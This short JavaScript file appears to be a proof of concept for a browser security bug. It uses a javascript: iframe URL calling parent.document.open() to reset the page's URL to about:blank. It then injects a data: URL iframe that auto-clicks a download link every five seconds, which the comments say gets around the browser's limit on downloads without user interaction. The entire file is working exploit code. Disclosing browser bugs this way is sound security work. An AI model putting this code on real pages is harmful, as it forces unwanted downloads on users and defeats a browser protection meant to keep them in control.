window.addEventListener("load", onLoad);

function onLoad(event) {
    var iframe = document.getElementById("iframe");

    // This will change the URL of the parent document to that of the iframe
    // document (i.e. about:blank).
    iframe.src = "javascript: parent.document.open()";

    setTimeout(() => {
        // This will cause the visible URL to be updated (to about:blank).
        // Without this, it would only be possible to download a single file
        // without further user interaction.
        history.pushState({}, "");

        var dataIframe = document.createElement("iframe");

        const src = `
        <a href="data:text/plain," id="download-link" download></a>

        <script>
            var downloadLink = document.getElementById("download-link");

            setInterval(function () {
                downloadLink.click();
            }, 5000);
        </script>
        `;

        dataIframe.src = "data:text/html," + src;

        document.write(dataIframe.outerHTML);
    }, 1000);
}
